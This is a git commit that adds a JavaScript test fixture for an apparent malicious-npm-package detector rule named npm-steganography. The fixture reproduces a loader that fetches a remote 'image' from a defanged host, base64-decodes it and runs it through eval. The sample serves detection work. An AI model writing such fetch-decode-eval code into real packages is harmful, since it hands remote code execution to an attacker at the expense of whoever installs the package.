735dddb11e3f08a34274990984d95cbcf9ee47a1
Sebastian Obregoso <sebastian.obregoso@datadoghq.com>
2024-06-20 18:36:33 +0200

    first implementation

---
+++ tests/analyzer/sourcecode/npm-steganography.js
@@ -0,0 +1,20 @@
+function f() {
+  const t = "base64",
+      c = "utf8",
+      ht = require("https"),
+      cors = () => {
+          const request = ht["get"]("hxxps://api.jz-aws[.]info/initial.png", 
+          function(response) {
+              let data = "";
+              response.on(data, r => {
+                  data += r
+              });
+              response.on(data, (() => {
+                  let plain = Buffer.from(data, t).toString();
+                  // ruleid: npm-steganography
+                  eval(plain)
+              }));
+          });
+      };
+  module.exports = cors;
+}
